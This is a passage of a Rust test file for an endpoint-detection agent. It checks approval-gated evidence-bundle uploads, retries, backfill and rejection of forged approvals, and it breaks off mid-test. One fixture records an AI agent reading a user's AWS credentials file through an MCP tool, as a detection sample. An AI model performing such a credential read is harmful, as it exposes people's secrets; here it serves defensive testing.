    #[tokio::test]
    async fn agent_edr_evidence_bundle_fleet_publish_uploads_raw_archive_to_control_api() {
        let bundle_dir = test_evidence_bundle_dir();
        let receipt_path = test_receipt_path();
        let (control_api_url, control_api_state, control_api_task) =
            spawn_mock_control_api_archive().await;
        let keypair = Keypair::from_seed(&[88u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state = test_state();
        let policy_path = state.settings.read().await.policy_path.clone();
        std::fs::write(
            policy_path,
            "version: \"test-edr\"\nname: agent-api-test\nedr:\n  telemetry:\n    raw_artifact_upload: true\n",
        )
        .unwrap_or_else(|err| panic!("failed to write raw archive upload policy: {err}"));
        {
            let mut settings = state.settings.write().await;
            settings.nats.tenant_id = Some("4b83d8d0-7b6d-4a3b-8cc4-0aa83d1f3b41".to_string());
            settings.nats.agent_id = Some("endpoint-agent-control-archive-1".to_string());
            settings.control_api.enabled = true;
            settings.control_api.url = Some(control_api_url.clone());
            settings.control_api.api_key = Some("configured-control-api-key".to_string());
        }
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: format!("agent-enrollment:{signer_public_key}"),
            signer_public_key,
        }));
        state.edr_evidence_bundle_store = Arc::new(Mutex::new(
            EndpointEvidenceBundleStore::open(&bundle_dir)
                .unwrap_or_else(|err| panic!("failed to open control archive bundle store: {err}")),
        ));

        let observation = EndpointObservation {
            observation_id: "control-archive-observation-1".to_string(),
            process: EndpointProcess {
                process_guid: Some("proc-control-archive-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: "control-archive.example.invalid".to_string(),
                port: 443,
                protocol: Some("tcp".to_string()),
                url: Some("https://control-archive.example.invalid/upload".to_string()),
            },
            ..EndpointObservation::default()
        };
        record_edr_observations(&state, std::slice::from_ref(&observation))
            .await
            .unwrap_or_else(|err| panic!("failed to seed control archive observation: {err:?}"));
        let state = Arc::new(state);
        let state = Arc::new(state);
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/graph-slices/export",
                post(agent_edr_graph_slice_export),
            )
            .route(
                "/api/v1/agent/edr/evidence-bundles/{bundle_id}/fleet-publish",
                post(agent_edr_evidence_bundle_fleet_publish),
            )
            .route(
                "/api/v1/agent/edr/evidence-bundles/{bundle_id}/archive",
                get(agent_edr_evidence_bundle_archive),
            )
            .with_state(Arc::clone(&state));

        let export_body = serde_json::json!({
            "process": {
                "processGuid": "proc-control-archive-1"
            },
            "sliceKind": "causal_subgraph",
            "maxDepth": 3,
            "reason": "control archive upload test"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/graph-slices/export")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(export_body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build control archive export request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("control archive export request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 512 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read control archive export response: {e}"));
        let export_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode control archive export response: {e}"));
        let bundle_id = export_payload["bundle"]["bundleId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing control archive bundle id"))
            .to_string();

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/evidence-bundles/{bundle_id}/archive"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build control archive preview request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("control archive preview request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 512 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read control archive preview response: {e}"));
        let archive_preview: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode control archive preview response: {e}"));
        assert_eq!(
            archive_preview["verification"]["verified"], true,
            "control archive preview verification failed: {archive_preview}"
        );

        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/evidence-bundles/{bundle_id}/fleet-publish"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| {
                panic!("failed to build control archive fleet publish request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("control archive fleet publish request failed: {e}"));
        let status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 512 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read control archive fleet publish response: {e}")
            });
        assert_eq!(
            status,
            StatusCode::ACCEPTED,
            "unexpected control archive fleet publish response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let payload: serde_json::Value = serde_json::from_slice(&bytes).unwrap_or_else(|e| {
            panic!("failed to decode control archive fleet publish response: {e}")
        });

        assert_eq!(payload["controlUpload"]["attempted"], false);
        assert_eq!(payload["controlUpload"]["accepted"], false);
        assert_eq!(payload["controlUpload"]["controlApiUrl"], control_api_url);
        assert_eq!(
            payload["controlUpload"]["rawArtifactApprovalRequired"],
            true
        );
        assert_eq!(
            payload["controlUpload"]["rawArtifactApprovalProvided"],
            false
        );
        assert!(payload["controlUpload"]["skippedReason"]
            .as_str()
            .is_some_and(|reason| reason.contains("rawArtifactApprovalId")));

        {
            let requests = control_api_state.requests.lock().await;
            assert_eq!(requests.len(), 0);
        }

        let forged_reason = "incident-control-archive-approved";
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/evidence-bundles/{bundle_id}/fleet-publish?rawArtifactApprovalId=approval-control-archive-forged&rawArtifactApprovalReason={forged_reason}"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| {
                panic!("failed to build forged control archive fleet publish request: {e}")
            });
        let response =
            app.clone().oneshot(req).await.unwrap_or_else(|e| {
                panic!("forged control archive fleet publish request failed: {e}")
            });
        let status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 512 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read forged control archive fleet publish response: {e}")
            });
        assert_eq!(
            status,
            StatusCode::CONFLICT,
            "unexpected forged control archive fleet publish response: {}",
            String::from_utf8_lossy(&bytes)
        );
        {
            let requests = control_api_state.requests.lock().await;
            assert_eq!(requests.len(), 0);
        }

        let approval_reason = "incident-control-archive-approved";
        let raw_artifact_approval_id = resolve_test_raw_artifact_approval(
            &state,
            &raw_artifact_approval_resource_for_evidence_bundle_fleet_publish(&bundle_id),
            approval_reason,
        )
        .await;
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/evidence-bundles/{bundle_id}/fleet-publish?rawArtifactApprovalId={raw_artifact_approval_id}&rawArtifactApprovalReason={approval_reason}"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| {
                panic!("failed to build approved control archive fleet publish request: {e}")
            });
        let response = app.oneshot(req).await.unwrap_or_else(|e| {
            panic!("approved control archive fleet publish request failed: {e}")
        });
        let status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 512 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read approved control archive fleet publish response: {e}")
            });
        assert_eq!(
            status,
            StatusCode::ACCEPTED,
            "unexpected approved control archive fleet publish response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let payload: serde_json::Value = serde_json::from_slice(&bytes).unwrap_or_else(|e| {
            panic!("failed to decode approved control archive fleet publish response: {e}")
        });

        assert_eq!(payload["controlUpload"]["attempted"], true);
        assert_eq!(payload["controlUpload"]["accepted"], true);
        assert_eq!(payload["controlUpload"]["httpStatus"], 200);
        assert_eq!(payload["controlUpload"]["controlApiUrl"], control_api_url);
        assert_eq!(
            payload["controlUpload"]["rawArtifactApprovalRequired"],
            true
        );
        assert_eq!(
            payload["controlUpload"]["rawArtifactApprovalProvided"],
            true
        );
        assert_eq!(
            payload["controlUpload"]["rawArtifactApprovalId"],
            raw_artifact_approval_id
        );
        assert!(payload["controlUpload"]["rawArtifactApprovalReasonHash"]
            .as_str()
            .is_some_and(|hash| hash.starts_with("0x")));

        let requests = control_api_state.requests.lock().await;
        assert_eq!(requests.len(), 1);
        let request = &requests[0];
        assert_eq!(
            request.api_key.as_deref(),
            Some("configured-control-api-key")
        );
        assert_eq!(request.body["bundleId"], bundle_id);
        assert_eq!(
            request.body["endpointAgentId"],
            "endpoint-agent-control-archive-1"
        );
        assert_eq!(request.body["archiveHash"], payload["archiveHash"]);
        assert_eq!(
            request.body["rawRef"],
            format!(
                "endpoint-evidence-bundle-archive:{}:{}",
                payload["archiveId"].as_str().unwrap_or_default(),
                payload["archiveHash"].as_str().unwrap_or_default()
            )
        );
        assert_eq!(request.body["archive"]["bundle"]["bundleId"], bundle_id);
        assert_eq!(request.body["verification"]["verified"], true);
        assert_eq!(
            request.body["rawArtifactApprovalId"],
            raw_artifact_approval_id
        );
        assert_eq!(
            request.body["rawArtifactApprovalReasonHash"],
            payload["controlUpload"]["rawArtifactApprovalReasonHash"]
        );
        assert_eq!(request.body["metadata"]["source"], "clawdstrike-agent");
        assert_eq!(request.body["metadata"]["receiptCount"], 1);
        assert_eq!(
            request.body["metadata"]["rawArtifactApprovalId"],
            raw_artifact_approval_id
        );

        control_api_task.abort();
        let _ = std::fs::remove_dir_all(bundle_dir);
        let _ = std::fs::remove_file(receipt_path);
    }

    #[tokio::test]
    async fn failed_control_archive_upload_is_queued_and_retried() {
        let bundle_dir = test_evidence_bundle_dir();
        let receipt_path = test_receipt_path();
        let retry_path = test_control_archive_upload_retry_path();
        let (control_api_url, control_api_state, control_api_task) =
            spawn_mock_control_api_archive().await;
        *control_api_state.failures_remaining.lock().await = 1;
        let keypair = Keypair::from_seed(&[89u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state = test_state();
        let policy_path = state.settings.read().await.policy_path.clone();
        std::fs::write(
            policy_path,
            "version: \"test-edr\"\nname: agent-api-test\nedr:\n  telemetry:\n    raw_artifact_upload: true\n",
        )
        .unwrap_or_else(|err| panic!("failed to write raw archive retry policy: {err}"));
        {
            let mut settings = state.settings.write().await;
            settings.nats.tenant_id = Some("4b83d8d0-7b6d-4a3b-8cc4-0aa83d1f3b41".to_string());
            settings.nats.agent_id = Some("endpoint-agent-control-archive-retry-1".to_string());
            settings.control_api.enabled = true;
            settings.control_api.url = Some(control_api_url.clone());
            settings.control_api.api_key = Some("configured-control-api-key".to_string());
        }
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: format!("agent-enrollment:{signer_public_key}"),
            signer_public_key,
        }));
        state.edr_evidence_bundle_store = Arc::new(Mutex::new(
            EndpointEvidenceBundleStore::open(&bundle_dir)
                .unwrap_or_else(|err| panic!("failed to open retry archive bundle store: {err}")),
        ));
        state.edr_control_archive_upload_retry_ledger = Arc::new(Mutex::new(
            EndpointControlArchiveUploadRetryLedger::open(&retry_path).unwrap_or_else(|err| {
                panic!("failed to open control archive upload retry ledger: {err}")
            }),
        ));

        let observation = EndpointObservation {
            observation_id: "control-archive-retry-observation-1".to_string(),
            process: EndpointProcess {
                process_guid: Some("proc-control-archive-retry-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: "control-archive-retry.example.invalid".to_string(),
                port: 443,
                protocol: Some("tcp".to_string()),
                url: Some("https://control-archive-retry.example.invalid/upload".to_string()),
            },
            ..EndpointObservation::default()
        };
        record_edr_observations(&state, std::slice::from_ref(&observation))
            .await
            .unwrap_or_else(|err| panic!("failed to seed retry archive observation: {err:?}"));
        let state = Arc::new(state);
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/graph-slices/export",
                post(agent_edr_graph_slice_export),
            )
            .route(
                "/api/v1/agent/edr/evidence-bundles/{bundle_id}/fleet-publish",
                post(agent_edr_evidence_bundle_fleet_publish),
            )
            .route(
                "/api/v1/agent/edr/control-archive-uploads/retry",
                post(agent_edr_control_archive_uploads_retry),
            )
            .with_state(Arc::clone(&state));

        let export_body = serde_json::json!({
            "process": {
                "processGuid": "proc-control-archive-retry-1"
            },
            "sliceKind": "causal_subgraph",
            "maxDepth": 3,
            "reason": "control archive retry test"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/graph-slices/export")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(export_body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build retry archive export request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("retry archive export request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 512 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read retry archive export response: {e}"));
        let export_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode retry archive export response: {e}"));
        let bundle_id = export_payload["bundle"]["bundleId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing retry archive bundle id"))
            .to_string();

        let approval_reason = "incident-control-archive-retry-approved";
        let raw_artifact_approval_id = resolve_test_raw_artifact_approval(
            &state,
            &raw_artifact_approval_resource_for_evidence_bundle_fleet_publish(&bundle_id),
            approval_reason,
        )
        .await;
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/evidence-bundles/{bundle_id}/fleet-publish?rawArtifactApprovalId={raw_artifact_approval_id}&rawArtifactApprovalReason={approval_reason}"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build retry archive fleet publish request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("retry archive fleet publish request failed: {e}"));
        assert_eq!(response.status(), StatusCode::ACCEPTED);
        let bytes = axum::body::to_bytes(response.into_body(), 512 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read retry archive fleet publish response: {e}"));
        let publish_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode retry archive publish response: {e}"));
        assert_eq!(publish_payload["controlUpload"]["attempted"], true);
        assert_eq!(publish_payload["controlUpload"]["accepted"], false);
        assert_eq!(publish_payload["controlUpload"]["retryQueued"], true);
        assert_eq!(publish_payload["controlUpload"]["httpStatus"], 503);
        assert_eq!(
            publish_payload["controlUpload"]["rawArtifactApprovalId"],
            raw_artifact_approval_id
        );
        let retry_id = publish_payload["controlUpload"]["retryId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing control archive retry id"));
        assert!(retry_id.starts_with("0x"));
        assert!(retry_path.is_file(), "retry ledger should be persisted");
        let retry_json = std::fs::read_to_string(&retry_path)
            .unwrap_or_else(|err| panic!("failed to read retry archive ledger: {err}"));
        assert!(retry_json.contains(
            publish_payload["archiveHash"]
                .as_str()
                .unwrap_or_else(|| panic!("missing retry archive hash"))
        ));
        assert!(retry_json.contains(&raw_artifact_approval_id));
        let mut shadow_archive_retries: serde_json::Value = serde_json::from_str(&retry_json)
            .unwrap_or_else(|err| panic!("failed to decode retry archive ledger: {err}"));
        {
            let shadow_archive_retry = shadow_archive_retries
                .as_array_mut()
                .and_then(|entries| entries.first_mut())
                .unwrap_or_else(|| panic!("missing retry archive ledger entry"));
            shadow_archive_retry
                .as_object_mut()
                .unwrap_or_else(|| panic!("retry archive ledger entry was not an object"))
                .insert(
                    "shadowArchiveHash".to_string(),
                    serde_json::json!("0xshadow-archive"),
                );
            assert_unknown_field_rejected::<EndpointControlArchiveUploadRetry>(
                shadow_archive_retry.clone(),
                "shadowArchiveHash",
            );
        }
        let shadow_archive_retry_path = test_control_archive_upload_retry_path();
        write_jsonl_value(&shadow_archive_retry_path, &shadow_archive_retries);
        let err = match read_control_archive_upload_retry_ledger(&shadow_archive_retry_path) {
            Ok(_) => panic!("expected shadow archive retry ledger rejection"),
            Err(err) => err,
        };
        assert_anyhow_error_mentions_unknown_field(err, "shadowArchiveHash");
        let _ = std::fs::remove_file(shadow_archive_retry_path);

        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/control-archive-uploads/retry")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(
                serde_json::json!({ "force": true, "limit": 10 }).to_string(),
            ))
            .unwrap_or_else(|e| panic!("failed to build control archive retry request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("control archive retry request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 512 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read control archive retry response: {e}"));
        let retry_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode control archive retry response: {e}"));
        assert_eq!(retry_payload["attempted"], 1);
        assert_eq!(retry_payload["delivered"], 1);
        assert_eq!(retry_payload["failed"], 0);
        assert_eq!(retry_payload["pending"], 0);
        assert_eq!(retry_payload["attempts"][0]["retryId"], retry_id);
        assert_eq!(
            retry_payload["attempts"][0]["archiveHash"],
            publish_payload["archiveHash"]
        );
        assert_eq!(retry_payload["attempts"][0]["delivered"], true);

        let requests = control_api_state.requests.lock().await;
        assert_eq!(requests.len(), 2);
        assert_eq!(
            requests[1].api_key.as_deref(),
            Some("configured-control-api-key")
        );
        assert_eq!(requests[1].body["bundleId"], bundle_id);
        assert_eq!(
            requests[1].body["archiveHash"],
            publish_payload["archiveHash"]
        );
        assert_eq!(requests[1].body["archive"]["bundle"]["bundleId"], bundle_id);
        assert_eq!(
            requests[1].body["rawArtifactApprovalId"],
            raw_artifact_approval_id
        );
        let retry_json_after = std::fs::read_to_string(&retry_path)
            .unwrap_or_else(|err| panic!("failed to read delivered retry archive ledger: {err}"));
        assert_eq!(retry_json_after.trim(), "[]");

        control_api_task.abort();
        let _ = std::fs::remove_dir_all(bundle_dir);
        let _ = std::fs::remove_file(receipt_path);
        let _ = std::fs::remove_file(retry_path);
    }

    #[tokio::test]
    async fn control_archive_upload_backfill_posts_stored_bundle_without_nats() {
        let bundle_dir = test_evidence_bundle_dir();
        let receipt_path = test_receipt_path();
        let (control_api_url, control_api_state, control_api_task) =
            spawn_mock_control_api_archive().await;
        let keypair = Keypair::from_seed(&[91u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state = test_state();
        let policy_path = state.settings.read().await.policy_path.clone();
        std::fs::write(
            policy_path,
            "version: \"test-edr\"\nname: agent-api-test\nedr:\n  telemetry:\n    raw_artifact_upload: true\n",
        )
        .unwrap_or_else(|err| panic!("failed to write raw archive backfill policy: {err}"));
        {
            let mut settings = state.settings.write().await;
            settings.nats.tenant_id = None;
            settings.nats.agent_id = None;
            settings.local_agent_id = Some("endpoint-agent-control-archive-backfill-1".to_string());
            settings.control_api.enabled = true;
            settings.control_api.url = Some(control_api_url.clone());
            settings.control_api.api_key = Some("configured-control-api-key".to_string());
        }
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: format!("agent-enrollment:{signer_public_key}"),
            signer_public_key,
        }));
        state.edr_evidence_bundle_store = Arc::new(Mutex::new(
            EndpointEvidenceBundleStore::open(&bundle_dir).unwrap_or_else(|err| {
                panic!("failed to open backfill archive bundle store: {err}")
            }),
        ));

        let observation = EndpointObservation {
            observation_id: "control-archive-backfill-observation-1".to_string(),
            process: EndpointProcess {
                process_guid: Some("proc-control-archive-backfill-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: "control-archive-backfill.example.invalid".to_string(),
                port: 443,
                protocol: Some("tcp".to_string()),
                url: Some("https://control-archive-backfill.example.invalid/upload".to_string()),
            },
            ..EndpointObservation::default()
        };
        record_edr_observations(&state, std::slice::from_ref(&observation))
            .await
            .unwrap_or_else(|err| panic!("failed to seed backfill archive observation: {err:?}"));
        let state = Arc::new(state);
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/graph-slices/export",
                post(agent_edr_graph_slice_export),
            )
            .route(
                "/api/v1/agent/edr/control-archive-uploads/backfill",
                post(agent_edr_control_archive_uploads_backfill),
            )
            .with_state(Arc::clone(&state));

        let export_body = serde_json::json!({
            "process": {
                "processGuid": "proc-control-archive-backfill-1"
            },
            "sliceKind": "causal_subgraph",
            "maxDepth": 3,
            "reason": "control archive backfill test"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/graph-slices/export")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(export_body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build backfill archive export request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("backfill archive export request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 512 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read backfill archive export response: {e}"));
        let export_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode backfill archive export response: {e}"));
        let bundle_id = export_payload["bundle"]["bundleId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing backfill archive bundle id"))
            .to_string();

        let forged_reason = "incident-control-archive-backfill-approved";
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/control-archive-uploads/backfill")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(
                serde_json::json!({
                    "bundleId": bundle_id,
                    "limit": 10,
                    "rawArtifactApprovalId": "approval-control-archive-backfill-forged",
                    "rawArtifactApprovalReason": forged_reason
                })
                .to_string(),
            ))
            .unwrap_or_else(|e| {
                panic!("failed to build forged control archive backfill request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("forged control archive backfill request failed: {e}"));
        let status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 512 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read forged control archive backfill response: {e}")
            });
        assert_eq!(
            status,
            StatusCode::CONFLICT,
            "unexpected forged control archive backfill response: {}",
            String::from_utf8_lossy(&bytes)
        );
        {
            let requests = control_api_state.requests.lock().await;
            assert_eq!(requests.len(), 0);
        }

        let approval_reason = "incident-control-archive-backfill-approved";
        let raw_artifact_approval_id = resolve_test_raw_artifact_approval(
            &state,
            &raw_artifact_approval_resource_for_control_archive_backfill(Some(&bundle_id)),
            approval_reason,
        )
        .await;
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/control-archive-uploads/backfill")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(
                serde_json::json!({
                    "bundleId": bundle_id,
                    "limit": 10,
                    "rawArtifactApprovalId": raw_artifact_approval_id,
                    "rawArtifactApprovalReason": approval_reason
                })
                .to_string(),
            ))
            .unwrap_or_else(|e| panic!("failed to build control archive backfill request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("control archive backfill request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 512 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read control archive backfill response: {e}"));
        let backfill_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode control archive backfill response: {e}"));
        assert_eq!(backfill_payload["attempted"], 1);
        assert_eq!(backfill_payload["delivered"], 1);
        assert_eq!(backfill_payload["failed"], 0);
        assert_eq!(backfill_payload["skipped"], 0);
        assert_eq!(backfill_payload["records"][0]["bundleId"], bundle_id);
        assert_eq!(
            backfill_payload["records"][0]["controlUpload"]["accepted"],
            true
        );
        assert_eq!(
            backfill_payload["records"][0]["controlUpload"]["rawArtifactApprovalId"],
            raw_artifact_approval_id
        );

        let requests = control_api_state.requests.lock().await;
        assert_eq!(requests.len(), 1);
        assert_eq!(
            requests[0].api_key.as_deref(),
            Some("configured-control-api-key")
        );
        assert_eq!(requests[0].body["bundleId"], bundle_id);
        assert_eq!(
            requests[0].body["endpointAgentId"],
            "endpoint-agent-control-archive-backfill-1"
        );
        assert_eq!(requests[0].body["metadata"]["uploadPath"], "local_backfill");
        assert_eq!(
            requests[0].body["rawArtifactApprovalId"],
            raw_artifact_approval_id
        );
        assert_eq!(
            requests[0].body["rawArtifactApprovalReasonHash"],
            backfill_payload["records"][0]["controlUpload"]["rawArtifactApprovalReasonHash"]
        );
        assert_eq!(
            requests[0].body["rawRef"],
            format!(
                "endpoint-evidence-bundle-archive:{}:{}",
                backfill_payload["records"][0]["archiveId"]
                    .as_str()
                    .unwrap_or_default(),
                backfill_payload["records"][0]["archiveHash"]
                    .as_str()
                    .unwrap_or_default()
            )
        );

        control_api_task.abort();
        let _ = std::fs::remove_dir_all(bundle_dir);
        let _ = std::fs::remove_file(receipt_path);
    }

    #[tokio::test]
    async fn agent_edr_graph_slice_export_rejects_missing_root() {
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/graph-slices/export",
                post(agent_edr_graph_slice_export),
            )
            .with_state(Arc::new(test_state()));
        let body = serde_json::json!({
            "rootNodeId": "node-does-not-exist",
            "sliceKind": "causal_context"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/graph-slices/export")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build missing-root graph-slice export: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("missing-root graph-slice export failed: {e}"));
        assert_eq!(response.status(), StatusCode::NOT_FOUND);
    }

    #[tokio::test]
    async fn agent_edr_agent_secret_touches_returns_agent_credential_graph_slices() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/agent-secret-touches",
                post(agent_edr_agent_secret_touches),
            )
            .with_state(state);
        let mut metadata = BTreeMap::new();
        metadata.insert(
            "agentId".to_string(),
            serde_json::Value::String("agent:codex".to_string()),
        );
        metadata.insert(
            "workloadId".to_string(),
            serde_json::Value::String("mcp-server".to_string()),
        );
        let observations = vec![
            EndpointObservation {
                observation_id: "agent-tool-1".to_string(),
                session_id: Some("agent-secret-session-1".to_string()),
                metadata: metadata.clone(),
                process: EndpointProcess {
                    process_guid: Some("proc-agent-secret-1".to_string()),
                    image: Some("/usr/bin/python3".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::ToolCall {
                    tool_name: "mcp__filesystem__read_file".to_string(),
                    parameters: serde_json::json!({
                        "path": "/Users/alice/.aws/credentials"
                    }),
                },
                ..EndpointObservation::default()
            },
            EndpointObservation {
                observation_id: "agent-credential-1".to_string(),
                session_id: Some("agent-secret-session-1".to_string()),
                metadata,
                process: EndpointProcess {
                    process_guid: Some("proc-agent-secret-1".to_string()),
                    image: Some("/usr/bin/python3".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::CredentialAccess {
                    kind: CredentialKind::CloudCredential,
                    path: Some("/Users/alice/.aws/credentials".to_string()),
                    name: Some("aws-credentials".to_string()),
                },
                ..EndpointObservation::default()
            },
        ];
        let body = serde_json::json!({
            "observations": observations,
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build agent findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("agent findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let body = serde_json::json!({
            "sessionId": "agent-secret-session-1",
            "credentialKind": "cloud_credential",
            "upstreamDepth": 3,
            "downstreamDepth": 1,
            "limit": 10
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/agent-secret-touches")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build agent-secret-touches request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("agent-secret-touches request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read agent-secret-touches response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
